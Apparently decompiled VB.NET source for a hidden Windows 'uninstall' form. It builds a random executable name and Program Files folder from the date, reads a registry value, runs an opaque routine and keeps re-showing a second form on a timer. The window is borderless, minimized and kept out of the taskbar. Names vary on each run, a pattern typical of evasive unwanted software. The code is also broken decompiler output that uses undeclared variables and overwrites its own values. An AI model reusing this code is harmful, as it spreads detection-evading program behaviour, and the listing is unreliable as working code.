Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports uninstall.Internal

Namespace WindowsApplication1

	<DesignerGenerated()>
	Public Partial Class Form1
		Inherits Form

	
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.CallConsumer
			Me.CloneConsumer()
		End Sub

	
		<MethodImpl(MethodImplOptions.NoOptimization)>
		Private Sub CallConsumer(sender As Object, e As EventArgs)
			Dim obj As Object
			Try

				ProjectData.ClearProjectError()

				Dim num2 As Integer = 2
				Dim num3 As Integer = DateAndTime.Month(DateAndTime.Now) * DateAndTime.Day(DateAndTime.Now)
				Dim num4 As Integer = num3 Mod 7
				Dim num5 As Integer = num3 Mod 9
				Dim num6 As Integer = num3 Mod 5
				Dim num7 As Integer = num3 Mod 3
				If num3 Mod 2 <> 0 Then
				End If
				MyBase.Name = Conversions.ToString(Strings.Chr(97 + num4)) + Conversions.ToString(Strings.Chr(98 + num5)) + Conversions.ToString(Strings.Chr(101 + num6)) + Conversions.ToString(Strings.Chr(99 + num7))
				MyBase.Name = Conversions.ToString(Strings.Chr(97 + num5)) + Conversions.ToString(Strings.Chr(98 + num4)) + Conversions.ToString(Strings.Chr(101 + num7)) + Conversions.ToString(Strings.Chr(99 + num6))
				DatabaseWrapper._ParserWrapper = MyBase.Name
				DatabaseWrapper.propertyWrapper = MyBase.Name + ".exe"
				VBMath.Randomize(CDbl(num3))
				Dim num8 As Long = CLng(Math.Round(CDbl(VBMath.Rnd()) * 100000.0 * 3.0 + 1.0))
				Dim text As String = ""
				Dim num9 As Integer = 1
				Do
					Dim num10 As Long = num8 Mod 10L + 105L
					text = Conversions.ToString(Strings.Chr(CInt(num10))) + text
					num8 /= 10L
					num9 += 1
				Loop While num9 <= 5
				DatabaseWrapper._ParserWrapper = text
				DatabaseWrapper.propertyWrapper = text + ".exe"
				DatabaseWrapper._TemplateWrapper = "C:\Program Files (x86)\" + Strings.Mid(text, 2, 4)
				MyBase.Show()
				Dim left As String = Conversions.ToString(DatabaseWrapper.TestConsumer(Registry.CurrentUser, "Software", "n", ""))
				If Operators.CompareString(left, "", False) <> 0 Then
				End If
				DatabaseWrapper.AssetConsumer()
				Thread.Sleep(7000)
				ProjectData.EndApp()
				Template.ResetConsumer.Form2.Show()
				Me.Timer2.Enabled = True
				Dim num11 As Integer = num12 + 1
				num12 = num2
			Catch obj2 When endfilter(TypeOf obj Is Exception And num <> 0 And num12 = 0)
				Dim ex As Exception = CType(obj2, Exception)
			End Try
		End Sub

	
		Private Sub ReadConsumer(sender As Object, e As EventArgs)
			If Not Template.ResetConsumer.Form2.Visible Then
				Template.ResetConsumer.Form2.Show()
			End If
		End Sub

	
		<DebuggerStepThrough()>
		Private Sub CloneConsumer()
			Me._Comparator = New Container()
			Me.Timer2 = New Timer(Me._Comparator)
			MyBase.SuspendLayout()
			Me.Timer2.Interval = 1000
			MyBase.AutoScaleDimensions = New SizeF(6F, 12F)
			MyBase.AutoScaleMode = AutoScaleMode.Font
			MyBase.ClientSize = New Size(385, 224)
			MyBase.ControlBox = False
			MyBase.FormBorderStyle = FormBorderStyle.None
			MyBase.Name = "Form1"
			MyBase.ShowInTaskbar = False
			Me.Text = "卸载"
			MyBase.WindowState = FormWindowState.Minimized
			MyBase.ResumeLayout(False)
		End Sub

	
		' (get) Token: 0x0600002B RID: 43 RVA: 0x0000243A File Offset: 0x0000063A
		' (set) Token: 0x0600002C RID: 44 RVA: 0x00002C98 File Offset: 0x00000E98
		Friend Overridable Property Timer2 As Timer
			<CompilerGenerated()>
			Get
				Return Me.m_Singleton
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.ReadConsumer
				Dim singleton As Timer = Me.m_Singleton
				If singleton IsNot Nothing Then
					RemoveHandler singleton.Tick, value2
				End If
				Me.m_Singleton = value
				singleton = Me.m_Singleton
				If singleton IsNot Nothing Then
					AddHandler singleton.Tick, value2
				End If
			End Set
		End Property

	
		<CompilerGenerated()>
		<AccessedThroughProperty("Timer2")>
		Private m_Singleton As Timer
	End Class
End Namespace
